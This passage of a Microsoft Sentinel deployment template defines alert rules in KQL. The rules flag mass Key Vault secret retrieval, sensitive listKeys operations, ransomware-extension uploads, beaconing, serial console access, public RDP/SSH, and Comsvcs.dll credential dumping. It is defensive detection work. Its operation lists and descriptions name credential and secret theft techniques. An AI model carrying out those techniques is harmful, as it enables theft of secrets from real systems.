          "query": "let sharedLinksThreshold = 5;\nlet timeInterval = 1d;\nOfficeActivity\n| where TimeGenerated > ago(timeInterval)\n| where Operation == 'AnonymousLinkCreated'\n| summarize URLs=make_set(OfficeObjectId, 5), DistinctURLs=dcount(OfficeObjectId),First=min(TimeGenerated),Last=max(TimeGenerated) by RecordType,  ClientIP , UserId, UserAgent\n| where DistinctURLs >= sharedLinksThreshold\n| mvexpand URLs\n| extend URLDetails = split(URLs,'/')\n| extend FileIndex = array_length(URLDetails)-1\n| extend FolderIndex = array_length(URLDetails)-2\n| extend FileDetail = strcat(URLDetails[FolderIndex],'/',URLDetails[FileIndex])\n| project First,Last,DistinctURLs, AccountCustomEntity = UserId, IPCustomEntity = ClientIP, FileDetail, URLs, UserAgent",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1213"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-068')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-068')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-068: [RBA] Azure KeyVault - Mass secret retrieval by a single user",
          "description": "This alert identifies when a single user performs a large number of secret retrievals from Azure Key Vault. MITRE: T1555 Category: Azure Key Vault tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "let timeframe=1d;\nlet EventCountThreshold = 25;\nlet OperationList = dynamic(\n['SecretGet', 'KeyGet', 'VaultGet']);\nAzureDiagnostics\n| where TimeGenerated > ago(timeframe)\n| extend ResultType = columnifexists('ResultType', 'None'), identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g = columnifexists('identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g', 'None')\n| where ResultType !~ 'None' and isnotempty(ResultType)\n| where identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g !~ 'None' and isnotempty(identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g)\n| where ResourceType =~ 'VAULTS' and ResultType =~ 'Success'\n| where OperationName in (OperationList) \n| summarize count() by identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g, OperationName\n| where count_ > EventCountThreshold  \n| join (\nAzureDiagnostics\n| where TimeGenerated > ago(timeframe)\n| extend ResultType = columnifexists('ResultType', 'NoResultType')\n| extend requestUri_s = columnifexists('requestUri_s', 'None'), identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g = columnifexists('identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g', 'None')\n| extend id_s = columnifexists('id_s', 'None'), CallerIPAddress = columnifexists('CallerIPAddress', 'None'), clientInfo_s = columnifexists('clientInfo_s', 'None')\n| where ResultType !~ 'None' and isnotempty(ResultType)\n| where identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g !~ 'None' and isnotempty(identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g)\n| where id_s !~ 'None' and isnotempty(id_s)\n| where CallerIPAddress !~ 'None' and isnotempty(CallerIPAddress)\n| where clientInfo_s !~ 'None' and isnotempty(clientInfo_s)\n| where requestUri_s !~ 'None' and isnotempty(requestUri_s)\n| where OperationName in~ (OperationList)   \n) on identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g \n| summarize EventCount=sum(count_), StartTimeUtc=min(TimeGenerated), EndTimeUtc=max(TimeGenerated), OperationNameList=make_set(OperationName), RequestURLList=make_set(requestUri_s) by ResultType, Resource, AccountCustomEntity = identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g, clientInfo_s,IPCustomEntity = CallerIPAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1555"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-198')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-198')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-198: [RBA] Azure Activity - Rare Subscription Operations",
          "description": "This alert looks for sensitive subscription-level events based on Azure Activity Logs. MITRE: T1578,T1526 Category: Azure Activity tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let starttime = 14d;\nlet endtime = 1d;\n// Operations to look out for are List keys, List Storage Account Keys, Register Subscription, Create or Update Snapshot, Create or Update Network Security Group\nlet SensitiveOperationList = dynamic(\n['listKeys', 'register', 'snapshots', 'networkSecurityGroups']);\nlet SensitiveActivity = AzureActivity\n| extend Action = tostring(parse_json(Authorization).action)\n| extend OperationNameValue = iff(isempty(OperationNameValue), Action, OperationNameValue)\n| where OperationNameValue has_any (SensitiveOperationList)\n| where ActivityStatusValue =~ 'Succeeded';\nSensitiveActivity\n| where TimeGenerated between (ago(starttime) .. ago(endtime))\n| summarize count() by CallerIpAddress, Caller\n| join kind = rightanti ( \nSensitiveActivity\n| where TimeGenerated between (ago(endtime) .. now())\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), ActivityStatusValue = makelist(ActivityStatusValue), \nResources = makelist(Resource), ActivityCountByCallerIPAddress = count()  //ActivityTimeStamp = makelist(TimeGenerated), OperationIds = makelist(OperationId), CorrelationIds = makelist(CorrelationId), ResourceGroups = makelist(ResourceGroup), ResourceIds = makelist(ResourceId), \nby CallerIpAddress, Caller, OperationNameValue\n) on CallerIpAddress, Caller\n| where Caller contains '@'\n| where (Caller matches regex A198_EXCLUDED_USER_ACCOUNTS) == false\n| extend AccountCustomEntity = Caller, IPCustomEntity = CallerIpAddress //timestamp = StartTimeUtc, \n| where ActivityCountByCallerIPAddress >= AZURE_ACTIVITIES_THRESHOLD\n| order by ActivityCountByCallerIPAddress\n| project\n    StartTimeUtc,\n    EndTimeUtc,\n    ActivityStatusValue,\n    Resources,\n    ActivityCountByCallerIPAddress,\n    IPCustomEntity,\n    Caller",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Discovery"
          ],
          "techniques": [
            "T1578",
            "T1526"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10562')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10562')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10562: [SOC] OfficeActivity - File Uploaded With Common Ransomware Extensions",
          "description": "Generates an alert when there are a huge number of file uploaded activities with common ransomware extensions. MITRE: T1059 Category: Office 365 tag: SOC",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1h;\nlet end_time = now();\nlet latency = 1h;\nlet alert_bin = 2h;\nOfficeActivity\n| where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where Operation in~ ('FileUploaded')\n| extend bv_src_user = UserId, bv_src_ip = ClientIP, bv_office_workload = OfficeWorkload, bv_site_url = Site_Url, bv_object = OfficeObjectId, bv_file_name = tolower(SourceFileName), bv_file_ext = strcat('.', tolower(SourceFileExtension))\n// ************************************************************************* \n//       <Exclusions>\n// *************************************************************************\n| mv-apply e = BV10562_EXCLUSIONS on (\n    extend keys = bag_keys(e) \n    | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n    | extend bv_file_name_excluded = iff(bv_file_name contains e.bv_file_name, true, false)\n    | extend bv_file_ext_excluded = iff(bv_file_ext contains e.bv_file_ext, true,false)\n    | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user, true,false)\n    | extend excluded_count = \n            iff(bv_file_name_excluded and isnotempty(e.bv_file_name), 1,0)\n            + iff(bv_file_ext_excluded and isnotempty(e.bv_file_ext), 1,0)\n            + iff(bv_src_user_excluded and isnotempty(e.bv_src_user), 1,0)\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where ExcludedEvent == false\n// ************************************************************************* \n//       </Exclusions>\n// *************************************************************************\n| where bv_file_name matches regex (COMMON_RANSOMWARE_EXTENSIONS) and bv_file_ext matches regex (COMMON_RANSOMWARE_EXTENSIONS)\n| summarize bv_event_count = count(), bv_src_ip = make_set(bv_src_ip, 5), bv_file_count = dcount(bv_file_name), bv_files = make_set(bv_file_name, 30), bv_object = make_set(bv_object, 30), bv_start_time = min(TimeGenerated), bv_end_time = arg_max(TimeGenerated, *), bv_file_ext = make_set(bv_file_ext, 30) by bv_src_user\n| where bv_file_count >= BV10562_FILE_COUNT_THRESHOLD\n| extend ExtendedDescription = strcat(\n    'bv_src_user: ', bv_src_user\n    ,'\\nbv_start_time: ', bv_start_time\n    ,'\\nbv_end_time: ', bv_end_time\n    ,'\\nbv_src_ip: ', bv_src_ip\n    ,'\\nbv_files (sample): ' , strcat_array(array_slice(bv_files, 0,5), '\\n* ')\n    ,'\\nbv_file_count: ', bv_file_count\n    ,'\\nbv_file_ext: ', bv_file_ext\n)\n| extend VictimEntity = pack_array(bv_src_user)\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend bv_mapping_tag = bv_src_user\n| project\n    bv_start_time\n    , bv_end_time\n    , bv_event_count\n    , bv_src_user\n    , bv_src_ip\n    , bv_file_count\n    , bv_files\n    , bv_object\n    , ExtendedDescription\n    , VictimEntity\n    , AttackerEntity\n    , RBAScore = 3\n    , bv_mapping_tag",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Generates an alert when there are a huge number of file uploaded activities with common ransomware extensions.\n\n{{ExtendedDescription}}\n\nMITRE: T1059\nCategory: Office 365\ntag: SOC"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-149')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-149')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-149: [RBA] Palo Alto - Potential Beaconing",
          "description": "Identifies beaconing patterns from Palo Alto Network traffic logs based on recurrent timedelta patterns. The query leverages various KQL functions to calculate time deltas and then compares it with total events observed in a day to find percentage of beaconing. This outbound beaconing pattern to untrusted public networks should be investigated for any malware callbacks or data exfiltration attempts. MITRE: T1071 Category: PaloAltoNetworks tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "let starttime = 2d;\nlet endtime = 1d;\nlet TimeDeltaThreshold = 10;\nlet TotalEventsThreshold = 15;\nlet PercentBeaconThreshold = 80;\nCommonSecurityLog\n| where DeviceVendor == 'Palo Alto Networks' and Activity == 'TRAFFIC'\n| where TimeGenerated between (ago(starttime)..ago(endtime))\n| where DestinationIP matches regex PRIVATE_IP == false\n| project TimeGenerated, DeviceName, SourceUserID, SourceIP, SourcePort, DestinationIP, DestinationPort, ReceivedBytes, SentBytes, DeviceAction\n| sort by SourceIP asc,TimeGenerated asc, DestinationIP asc, DestinationPort asc\n| serialize\n| extend nextTimeGenerated = next(TimeGenerated, 1), nextSourceIP = next(SourceIP, 1)\n| extend TimeDeltainSeconds = datetime_diff('second',nextTimeGenerated,TimeGenerated)\n| where SourceIP == nextSourceIP\n| where TimeDeltainSeconds > TimeDeltaThreshold \n| project TimeGenerated, TimeDeltainSeconds, DeviceName, SourceUserID, SourceIP, SourcePort, DestinationIP, DestinationPort, ReceivedBytes, SentBytes, DeviceAction\n| summarize count(), sum(ReceivedBytes), sum(SentBytes), make_list(TimeDeltainSeconds) \nby TimeDeltainSeconds, bin(TimeGenerated, 1h), DeviceName, SourceUserID, SourceIP, DestinationIP, DestinationPort, DeviceAction\n| summarize (MostFrequentTimeDeltaCount, MostFrequentTimeDeltainSeconds) = arg_max(count_, TimeDeltainSeconds), TotalEvents=sum(count_), TotalSentBytes = sum(sum_SentBytes), TotalReceivedBytes = sum(sum_ReceivedBytes)\nby bin(TimeGenerated, 1h), DeviceName, SourceUserID, SourceIP, DestinationIP, DestinationPort, DeviceAction\n| where TotalEvents > TotalEventsThreshold \n| extend BeaconPercent = MostFrequentTimeDeltaCount/toreal(TotalEvents) * 100\n| where BeaconPercent > PercentBeaconThreshold\n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIP, AccountCustomEntity = SourceUserID, HostCustomEntity = DeviceName , DeviceAction\n| project TimeGenerated, DeviceName , SourceIP, DestinationIP , DestinationPort, DeviceAction, TotalEvents, TotalSentBytes , TotalReceivedBytes, BeaconPercent",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1621')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1621')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1621: [RBA] AzureActivity - Connect To A VM By Serial Console",
          "description": "This alerts when there's any connection to Azure Virtual Machines via the use of the Serial Console. MITRE: T1133 Category: Azure Activity tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;\nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV1621_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV1621_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};      \nAzureActivity\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where ResourceId has '/providers/Microsoft.SerialConsole/serialPorts/0' and ActivityStatus =~ 'Succeeded'\n| parse ResourceId with * '/virtualMachines/' bv_src_dvc '/providers/' *\n| project \n    bv_user = Caller\n    , bv_src_user = Caller\n    , bv_src_ip = CallerIpAddress\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc\n    , bv_alert_time = now()\n    , bv_vendor_product = 'AzureActivity'\n    , sourcetype = 'AzureActivity'\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-1621')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_cim_normalize_username(bv_user))\n| extend bv_alarm_attacker_entities = pack_array(bv_cim_normalize_username(bv_user))\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription           ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "InitialAccess"
          ],
          "techniques": [
            "T1133"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-1621: [RBA] AzureActivity - Connect To A VM By Serial Console",
            "alertDescriptionFormat": "This alerts when there's any connection to Azure Virtual Machines via the use of the Serial Console\n\n{{ExtendedDescription}}\n\nMITRE: T1133\nCategory: Azure Activity\ntag: RBA"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10558')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10558')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10558: [Hygiene] Palo Alto - RDP and SSH Connections From Public IPs",
          "description": "Detects RDP and SSH connections from the Internet. This type of connections should be performed through a VPN tunnel. Exceptions can be added for approved applications. MITRE: T1021 Category: PaloAltoNetworks tag: Hygiene",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1d;\nlet end_time = now();\nlet latency = 0d;\nlet alert_bin = 1d;\nlet alert_number = 'BV-10558';\nlet PreviousAlerts = toscalar(SecurityAlert\n| where TimeGenerated between (ago(BV10558_SUPPRESSION_THRESHOLD) .. end_time)\n| where AlertName has alert_number\n| mv-expand parse_json(Entities)\n| extend IPAddress = iff(Entities.Type =~ 'ip', Entities.Address, '')\n| summarize make_set_if(IPAddress, isnotempty(IPAddress)));  \nCommonSecurityLog\n| where TimeGenerated between (ago(latency + start_time).. end_time) and ingestion_time() > ago(start_time)\n| where DeviceProduct =~ 'PAN-OS'\n| where SourceIP !in (PreviousAlerts)\n| where ipv4_is_private(SourceIP) == false\n| where DestinationPort in (3389, 22)\n| extend Blocked = iff(DeviceAction has_any ('Deny', 'denied', 'drop', 'block'), true, false)\n| where not(Blocked)\n| project TimeGenerated, SourceIP, DestinationIP, Protocol, DeviceAction, DestinationPort\n| summarize bv_event_count = count(), bv_start_time = min(TimeGenerated), bv_end_time = max(TimeGenerated), bv_dest_ip_count = dcount(DestinationIP), bv_dest_ip = make_set(DestinationIP, 30), bv_vendor_action = make_set(DeviceAction, 5) by bv_src_ip = SourceIP\n| where bv_event_count >= BV10558_EVENT_THRESHOLD\n| extend VictimEntity = pack_array(bv_src_ip)\n| extend AttackerEntity = pack_array(bv_src_ip)      \n| project\n    bv_start_time\n    , bv_end_time\n    , bv_src_ip\n    , bv_dest_ip\n    , bv_dest_ip_count\n    , bv_event_count\n    , bv_vendor_action\n    , VictimEntity\n    , AttackerEntity\n    , RBAScore = 1",
          "queryFrequency": "P1D",
          "queryPeriod": "P3D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement"
          ],
          "techniques": [
            "T1021"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT8H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "IP"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "RBAScore": "RBAScore",
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2500')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2500')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2500: [SOC] Windows - Password Dump Comsvcs",
          "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n\nThis rule identifies the use of Comsvcs.dll to dump credentials\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host MITRE: T1003 Category: Windows Security tag: SOC tag: Zero-Day",
          "severity": "High",
          "enabled": true,
